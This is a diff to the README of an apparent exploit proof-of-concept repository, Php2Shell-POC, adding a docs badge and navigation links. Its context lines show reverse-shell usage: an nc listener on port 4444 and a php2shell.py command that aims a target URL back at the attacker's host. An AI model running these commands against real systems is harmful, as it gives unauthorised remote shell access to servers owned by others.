@@ -10,6 +10,7 @@
 [![Forks](https://img.shields.io/github/forks/Whackermelon/Php2Shell-POC?style=social)](https://github.com/Whackermelon/Php2Shell-POC/network/members)
 [![Issues](https://img.shields.io/github/issues/Whackermelon/Php2Shell-POC?style=social)](https://github.com/Whackermelon/Php2Shell-POC/issues)
 [![Last commit](https://img.shields.io/github/last-commit/Whackermelon/Php2Shell-POC?style=flat-square&color=blue)](https://github.com/Whackermelon/Php2Shell-POC/commits/main)
+[![Pages](https://img.shields.io/badge/docs-whackermelon.github.io%2FPhp2Shell--POC-blue?style=flat-square)](https://whackermelon.github.io/Php2Shell-POC/)
 [![CVE-2026-109618](https://img.shields.io/badge/CVE-2026-109618-critical-red?style=flat-square)](https://github.com/Whackermelon/Php2Shell-POC/security/advisories)
 [![CVE-2026-109619](https://img.shields.io/badge/CVE-2026-109619-critical-red?style=flat-square)](https://github.com/Whackermelon/Php2Shell-POC/security/advisories)
 [![CVSS v4.0](https://img.shields.io/badge/CVSS%20v4.0-9.2%20critical-critical?style=flat-square)](https://nvd.nist.gov/vuln/detail/CVE-2026-109618)
@@ -26,6 +27,16 @@
 <p align="center">
   <b>One URL in, a reverse shell out.</b><br>
   <code>nc -lvnp 4444</code> in one terminal, <code>python3 php2shell.py &lt;URL&gt; -l &lt;LHOST&gt; -p 4444</code> in the other.
+</p>
+
+<p align="center">
+  <a href="https://whackermelon.github.io/Php2Shell-POC/">🌐 Read the write-up on the web</a>
+  &nbsp;·&nbsp;
+  <a href="https://github.com/Whackermelon/Php2Shell-POC/issues">🐛 Report an issue</a>
+  &nbsp;·&nbsp;
+  <a href="https://github.com/Whackermelon/Php2Shell-POC/discussions">💬 Discussions</a>
+  &nbsp;·&nbsp;
+  <a href="https://github.com/Whackermelon">👤 Whackermelon</a>
 </p>
 
 ---
